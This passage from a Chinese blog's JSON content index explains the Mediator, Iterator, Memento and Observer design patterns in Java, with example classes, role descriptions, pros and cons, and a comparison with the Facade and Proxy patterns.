* 抽象同事类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractColleague</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> AbstractMediator mediator;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AbstractColleague</span><span class=\"params\">(AbstractMediator mediator)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.mediator = mediator;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 消息回调</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">callback</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 发送消息</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">contact</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        mediator.operation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteColleagueA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractColleague</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcreteColleagueA</span><span class=\"params\">(AbstractMediator mediator)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(mediator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">callback</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;A收到消息&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteColleagueB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractColleague</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ConcreteColleagueB</span><span class=\"params\">(AbstractMediator mediator)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(mediator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">callback</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;B收到消息&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException, ScriptException &#123;</span><br><span class=\"line\">        <span class=\"type\">AbstractMediator</span> <span class=\"variable\">mediator</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcreteMediator</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ConcreteColleagueA</span> <span class=\"variable\">colleagueA</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcreteColleagueA</span>(mediator);</span><br><span class=\"line\">        mediator.register(colleagueA);</span><br><span class=\"line\">        <span class=\"type\">ConcreteColleagueB</span> <span class=\"variable\">colleagueB</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ConcreteColleagueB</span>(mediator);</span><br><span class=\"line\">        mediator.register(colleagueB);</span><br><span class=\"line\"></span><br><span class=\"line\">        colleagueA.contact();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Mediator（抽象中介者）：它定义一个接口，该接口用于与各同事对象之间进行通信。</li>\n<li>ConcreteMediator（具体中介者）：它是抽象中介者的子类，通过协调各个同事对象来实现协作行为，它维持了对各个同事对象的引用。</li>\n<li>Colleague（抽象同事类）：它定义各个同事类公有的方法，并声明了一些抽象方法来供子类实现，同时它维持了一个对抽象中介者类的引用，其子类可以通过该引用来与中介者通信。</li>\n<li>ConcreteColleague（具体同事类）：它是抽象同事类的子类；每一个同事对象在需要和其他同事对象通信时，先与中介者通信，通过中介者来间接完成与其他同事类的通信；在具体同事类中实现了在抽象同事类中声明的抽象方法。</li>\n<li>同事类指互相之间有关联的类。</li>\n</ul>\n<h3 id=\"外观模式、代理模式、中介者模式\"><a href=\"#外观模式、代理模式、中介者模式\" class=\"headerlink\" title=\"外观模式、代理模式、中介者模式\"></a>外观模式、代理模式、中介者模式</h3><p><strong>外观模式：</strong> 为子系统中的一组接口提供一个统一的入口。外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。<br>在外观模式中，外观模式所有的请求处理都委托给子系统完成，而中介者模式则由中心协调同事类和中心本身共同完成业务。外观模式属于单向操作，调用者和子系统可以理解为1-&gt;N。</p>\n<p><strong>代理模式：</strong> 给某一个对象提供一个代理或占位符，并由代理对象来控制对原对象的访问。在某些情况下，一个对象不适合或者不能直接引用另一个对象，而代理对象可以在客户端和目标对象之间起到传递的作用。<br>在代理模式中，代理类用于隐藏真实对象、扩展额外功能。可以理解为代理模式为1-&gt;1。</p>\n<p><strong>中介者模式：</strong> 可以理解为N&lt;–&gt;N解耦。</p>\n<h3 id=\"中介者模式总结\"><a href=\"#中介者模式总结\" class=\"headerlink\" title=\"中介者模式总结\"></a>中介者模式总结</h3><p>在中介者模式中，中介者承担两方面的职责：</p>\n<ul>\n<li>中转作用（结构性）：通过中介者提供的中转作用，各个同事对象就不再需要显式引用其他同事，当需要和其他同事进行通信时，通过中介者即可。该中转作用属于中介者在结构上的支持。</li>\n<li>协调作用（行为性）：中介者可以更进一步的对同事之间的关系进行封装，同事可以一致地和中介者进行交互，而不需要指明中介者需要具体怎么做，中介者<br>根据封装在自身内部的协调逻辑，对同事的请求进行进一步处理，将同事成员之间的关系行为进行分离和封装。该协调作用属于中介者在行为上的支持。</li>\n</ul>\n<p>在群组聊天中，可以采用中介者模式。<br>一般在需要抽取一个可以管理其他业务的对象作为中介者，各个相关对象互相之间不打交道，与中介者打交道，之后由中介者通过相关规则通知到其他关联对象。<br>如果在系统中存在大量多对多关系时，不需要第一时间采用中介者模式，可以考虑下是否系统设计不够合理。</p>\n<p>在JDK中应用中介者模式有：</p>\n<ul>\n<li>All scheduleXXX() methods of java.util.Timer</li>\n<li>java.util.concurrent.Executor#execute()</li>\n<li>submit() and invokeXXX() methods of java.util.concurrent.ExecutorService</li>\n<li>scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService</li>\n<li>java.lang.reflect.Method#invoke()<br>由于能力有限，并未找到上述类中使用了中介者模式，也未找到相关文档。</li>\n</ul>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>系统中对象之间存在复杂的引用关系，产生的相互依赖关系结构混乱且难以理解。</li>\n<li>一个对象由于引用了其他很多对象并且直接和这些对象通信，导致难以复用该对象。</li>\n<li>想通过一个中间类来封装多个类中的行为，而又不想生成太多的子类。可以通过引入中介者类来实现，在中介者中定义对象。</li>\n<li>交互的公共行为，如果需要改变行为则可以增加新的中介者类。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>中介者模式简化了对象之间的交互，它用中介者和同事的一对多交互代替了原来同事之间的多对多交互，一对多关系更容易理解、维护和扩展，将原本难以理解的网状结构转换成相对简单的星型结构。</li>\n<li>中介者模式可将各同事对象解耦。中介者有利于各同事之间的松耦合，我们可以独立的改变和复用每一个同事和中介者，增加新的中介者和新的同事类都比较方便，更好地符合“开闭原则”。</li>\n<li>可以减少子类生成，中介者将原本分布于多个对象间的行为集中在一起，改变这些行为只需生成新的中介者子类即可，这使各个同事类可被重用，无须对同事类进行扩展。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>在具体中介者类中包含了大量同事之间的交互细节，可能会导致具体中介者类非常复杂，使得系统难以维护。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","中介者模式","Mediator Pattern"]},{"title":"Java设计模式-迭代器模式（Iterator Pattern）","url":"/2017/10/30/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%88Iterator-Pattern%EF%BC%89/","content":"<h3 id=\"迭代器模式\"><a href=\"#迭代器模式\" class=\"headerlink\" title=\"迭代器模式\"></a>迭代器模式</h3><blockquote>\n<p>提供一种方法来访问聚合对象，而不用暴露这个对象的内部表示，其别名为游标(Cursor)。迭代器模式是一种对象行为型模式。</p>\n</blockquote>\n<p>UML类图如下：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8A%E5%8D%888.55.56.png\"><span id=\"more\"></span></p>\n<ul>\n<li>Iterator（抽象迭代器）：它定义了访问和遍历元素的接口，声明了用于遍历数据元素的方法；</li>\n<li>ConcreteIterator（具体迭代器）：它实现了抽象迭代器接口，完成对聚合对象的遍历，同时在具体迭代器中通过游标来记录在聚合对象中所处的当前位置，在具体实现时，游标通常是一个表示位置的非负整数。</li>\n<li>Aggregate（抽象聚合类）：它用于存储和管理元素对象，声明一个createIterator()方法用于创建一个迭代器对象，充当抽象迭代器工厂角色。</li>\n<li>ConcreteAggregate（具体聚合类）：它实现了在抽象聚合类中声明的createIterator()方法，该方法返回一个与该具体聚合类对应的具体迭代器ConcreteIterator实例。</li>\n</ul>\n<p>在迭代器模式中，提供了一个外部的迭代器来对聚合对象进行访问和遍历，迭代器定义了一个访问该聚合元素的接口，并且可以跟踪当前遍历的元素，了解哪些元素已经遍历过而哪些没有。迭代器的引入，将使得对一个复杂聚合对象的操作变得简单。</p>\n<h3 id=\"JDK迭代器\"><a href=\"#JDK迭代器\" class=\"headerlink\" title=\"JDK迭代器\"></a>JDK迭代器</h3><p>在常用的集合类都有其迭代器，以常用ArrayList作为例子：<br>ArrayList的基础关系类图如下：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8A%E5%8D%889.10.00.png\"><br>Collection接口有个父接口为Iterable，Iterable中方法iterator获取迭代器Iterator。<br>在ArrayList实现了接口方法iterator，如图：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8A%E5%8D%889.13.49.png\"></p>\n<p>在ArrayList同时还提供逆向迭代listIterable。</p>\n<h3 id=\"迭代器总结\"><a href=\"#迭代器总结\" class=\"headerlink\" title=\"迭代器总结\"></a>迭代器总结</h3><p>迭代器模式是一种使用频率非常高的设计模式，通过引入迭代器可以将数据的遍历功能从聚合对象中分离出来，聚合对象只负责存储数据，而遍历数据由迭代器来完成。由于很多编程语言的类库都已经实现了迭代器模式，因此在实际开发中，我们只需要直接使用Java等语言已定义好的迭代器即可。</p>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>访问一个聚合对象的内容而无须暴露它的内部表示。将聚合对象的访问与内部数据的存储分离，使得访问聚合对象时无须了解其内部实现细节。</li>\n<li>需要为一个聚合对象提供多种遍历方式。</li>\n<li>为遍历不同的聚合结构提供一个统一的接口，在该接口的实现类中为不同的聚合结构提供不同的遍历方式，而客户端可以一致性地操作该接口。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>它支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式。在迭代器模式中只需要用一个不同的迭代器来替换原有迭代器即可改变遍历算法，我们也可以自己定义迭代器的子类以支持新的遍历方式。</li>\n<li>迭代器简化了聚合类。由于引入了迭代器，在原有的聚合对象中不需要再自行提供数据遍历等方法，这样可以简化聚合类的设计。</li>\n<li>在迭代器模式中，由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，满足“开闭原则”的要求。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。</li>\n<li>抽象迭代器的设计难度较大，需要充分考虑到系统将来的扩展，例如JDK内置迭代器Iterator就无法实现逆向遍历，如果需要实现逆向遍历，只能通过其子类ListIterator等来实现，而ListIterator迭代器无法用于操作Set类型的聚合对象。在自定义迭代器时，创建一个考虑全面的抽象迭代器并不是件很容易的事情。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","迭代器模式","Iterator Pattern"]},{"title":"Java设计模式-备忘录模式（Memento Pattern）","url":"/2017/10/31/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F%EF%BC%88Memento-Pattern%EF%BC%89/","content":"<h3 id=\"备忘录模式\"><a href=\"#备忘录模式\" class=\"headerlink\" title=\"备忘录模式\"></a>备忘录模式</h3><blockquote>\n<p>在不破坏封装的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，这样可以在以后将对象恢复到原先保存的状态。它是一种对象行为型模式，其别名为Token。</p>\n</blockquote>\n<p>备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原，当前很多软件都提供了撤销(Undo)操作，其中就使用了备忘录模式。</p>\n<p>备忘录模式的核心是备忘录类以及用于管理备忘录的负责人类的设计，UML类图如下：<br><img src=\"/images/old/20171102%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-31%E4%B8%8A%E5%8D%889.22.13.png\"><span id=\"more\"></span></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 原发器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Originator</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String state;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 备份还原</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> memento</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">restoreMemento</span><span class=\"params\">(Memento memento)</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = memento.getState();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 创建备份</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Memento <span class=\"title function_\">createMemento</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Memento</span>(state);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 备忘录</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Memento</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 备份状态，这里是保存备忘录对应状态，可以采用原型模式</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> String state;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 创建备忘录</span></span><br><span class=\"line\"><span class=\"comment\">     * 为了避免备忘录被其他不相干类使用，构造函数权限为默认，只允许同一个包调用，或者设置类为默认权限</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> state</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    Memento(String state) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getState</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setState</span><span class=\"params\">(String state)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.state = state;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 备忘录负责人</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Caretaker</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//存储的备忘录只能还原一次，可以设计为集合或者链表</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Memento memento;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Memento <span class=\"title function_\">getMemento</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> memento;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setMemento</span><span class=\"params\">(Memento memento)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.memento = memento;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Originator（原发器）：它是一个普通类，可以创建一个备忘录，并存储它的当前内部状态，也可以使用备忘录来恢复其内部状态，一般将需要保存内部状态的类设计为原发器。</li>\n<li>Memento（备忘录)：存储原发器的内部状态，根据原发器来决定保存哪些内部状态。备忘录的设计一般可以参考原发器的设计，根据实际需要确定备忘录类中的属性。需要注意的是，除了原发器本身与负责人类之外，备忘录对象不能直接供其他类使用，原发器的设计在不同的编程语言中实现机制会有所不同。</li>\n<li>Caretaker（负责人）：负责人又称为管理者，它负责保存备忘录，但是不能对备忘录的内容进行操作或检查。在负责人类中可以存储一个或多个备忘录对象，它只负责存储对象，而不能修改对象，也无须知道对象的实现细节。</li>\n</ul>\n<p>在下棋时，有时需要悔棋操作，可以采用备忘录设计模式：范例省略</p>\n<h3 id=\"备忘录总结\"><a href=\"#备忘录总结\" class=\"headerlink\" title=\"备忘录总结\"></a>备忘录总结</h3><p>在使用备忘录模式时和命令模式结合可以达到很好的效果，如：在每次接收命令时，存储当前状态，之后如果业务需要回滚，可以通过备忘录回滚到指定状态。备忘录可以方便和原型模式使用，需要记录备忘录的时候直接克隆当前对象。</p>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>保存一个对象在某一个时刻的全部状态或部分状态，这样以后需要时它能够恢复到先前的状态，实现撤销操作。</li>\n<li>防止外界对象破坏一个对象历史状态的封装性，避免将对象历史状态的实现细节暴露给外界对象。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>它提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原。</li>\n<li>备忘录实现了对信息的封装，一个备忘录对象是一种原发器对象状态的表示，不会被其他代码所改动。备忘录保存了原发器的状态，采用列表、堆栈等集合来存储备忘录对象可以实现多次撤销操作。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>资源消耗过大，如果需要保存的原发器类的成员变量太多，就不可避免需要占用大量的存储空间，每保存一次对象的状态都需要消耗一定的系统资源。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","备忘录模式","Memento Pattern"]},{"title":"Java设计模式-观察者模式（Observer Pattern）","url":"/2017/11/02/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%88Observer-Pattern%EF%BC%89/","content":"<h3 id=\"观察者模式\"><a href=\"#观察者模式\" class=\"headerlink\" title=\"观察者模式\"></a>观察者模式</h3><blockquote>\n<p>定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象皆得到通知并被自动更新。观察者模式的别名包括发布-订阅（Publish&#x2F;Subscribe）模式、模型-视图（Model&#x2F;View）模式、源-监听器（Source&#x2F;Listener）模式或从属者（Dependents）模式。观察者模式是一种对象行为型模式。</p>\n</blockquote>\n<p>观察者模式是使用频率最高的设计模式之一，它用于建立一种对象与对象之间的依赖关系，一个对象发生改变时将自动通知其他对象，其他对象将相应作出反应。在观察者模式中，发生改变的对象称为观察目标，而被通知的对象称为观察者，一个观察目标可以对应多个观察者，而且这些观察者之间可以没有任何相互联系，可以根据需要增加和删除观察者，使得系统更易于扩展。</p>\n<p>在路上，交通信号灯属于观察者模式，驾驶员观察信号灯的变化，做相应的动作。</p>\n<p>UML类图如下：<br><img src=\"/images/old/20171104%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-11-02%E4%B8%8A%E5%8D%8810.58.18.png\"></p>\n<span id=\"more\"></span>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 目标类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractSubject</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//定义观察者集合存储观察者，可抽取到第三方类</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> List&lt;Observer&gt; observerList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 新增观察者</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> observer</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">attach</span><span class=\"params\">(Observer observer)</span>&#123;</span><br><span class=\"line\">        observerList.add(observer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 删除观察者</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> observer</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">detach</span><span class=\"params\">(Observer observer)</span>&#123;</span><br><span class=\"line\">        observerList.remove(observer);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">notifyObserver</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体目标类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteSubject</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractSubject</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">notifyObserver</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;通知前操作&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Observer observer : observerList) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//一般避免阻塞，此处可设置为异步</span></span><br><span class=\"line\">            observer.update();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;通知完毕&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 观察者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">Observer</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">update</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 具体观察者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteObserver</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Observer</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">update</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;通过更新&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Subject（目标）：目标又称为主题，它是指被观察的对象。在目标中定义了一个观察者集合，一个观察目标可以接受任意数量的观察者来观察，它提供一系列方法来增加和删除观察者对象，同时它定义了通知方法。</li>\n<li>ConcreteSubject（具体目标）：具体目标是目标类的子类，通常它包含有经常发生改变的数据，当它的状态发生改变时，向它的各个观察者发出通知；</li>\n<li>Observer（观察者）：观察者将对观察目标的改变做出反应，观察者一般定义为接口，该接口声明了更新数据的方法update()，因此又称为抽象观察者。</li>\n<li>ConcreteObserver（具体观察者）：在具体观察者中维护一个指向具体目标对象的引用，它存储具体观察者的有关状态，这些状态需要和具体目标的状态保持一致；通常在实现时，可以调用具体目标类的attach()方法将自己添加到目标类的集合中或通过detach()方法将自己从目标类的集合中删除。</li>\n</ul>\n<p>在实际开发中，可能相对复杂，在目标类通知观察者时，可能会依据需求做相应调整，如观察者入参添加目标类，或者直接添加目标类相应属性。</p>\n<p>举例：<br>在用户购买商品后，可能需要记录日志、记录订单、通知大数据、通知商家、通知客服系统、通知活动、通知优惠卷系统等。如果在开发中，增加或者修改其中的业务，会因为系统耦合度太高修改困难。可以采用观察者模式，解决系统之间耦合太高。<br>具体代码略。</p>\n<h4 id=\"Java中使用\"><a href=\"#Java中使用\" class=\"headerlink\" title=\"Java中使用\"></a>Java中使用</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java.util.Observer</span><br><span class=\"line\">java.util.EventListener</span><br><span class=\"line\">javax.servlet.http.HttpSessionBindingListener</span><br></pre></td></tr></table></figure>\n\n<p>Observer由jdk提供的观察者。对于不是很复杂需求，可以直接使用。<br>在阅读spring源码时，有不少fireXXXX()方法，这是在事件触发后调用。</p>\n<h3 id=\"类似设计模式比较\"><a href=\"#类似设计模式比较\" class=\"headerlink\" title=\"类似设计模式比较\"></a>类似设计模式比较</h3><p>在学习设计模式过程中，理解不同的设计模式时，有时候困惑设计模式之间的差异</p>\n<p><strong>外观设计模式：</strong> 客户端类与多个其他业务类交互，如果平常开发，是一个类里面有其他业务类的引用。如果现在有另外一个客户端需要需要与这些业务相交互，也需要同时引入这些类，这个时候需要引入一个外观类来减少客户端对外部其他业务类的耦合，由外观类关联其他业务系统。对于外观设计模式而言不涉及到具体行为，只是类与类之间的组合关系，所以外观类属于结构型设计模式。<br>举例：现在A想去新马泰旅游（不需要管具体细节如坐车、买票等行为），A需要了解新加坡（持有新加坡对象）、马来西亚（持有马来西亚对象）、泰国（持有泰国对象），如果需要新增地点，需要同时了解新地点以及持有新地点，过于繁琐。现在因为外部因素，时间精力不够等，需要解决这种问题，可以找旅行社定制旅游计划，A用户只需要和旅行社联系即可，想去哪里直接和旅行社打交道，不需要与具体地点联系。与此同时如果有B也有同样的需要，就可以减少类之间的交互。</p>\n<p><strong>代理模式：</strong> 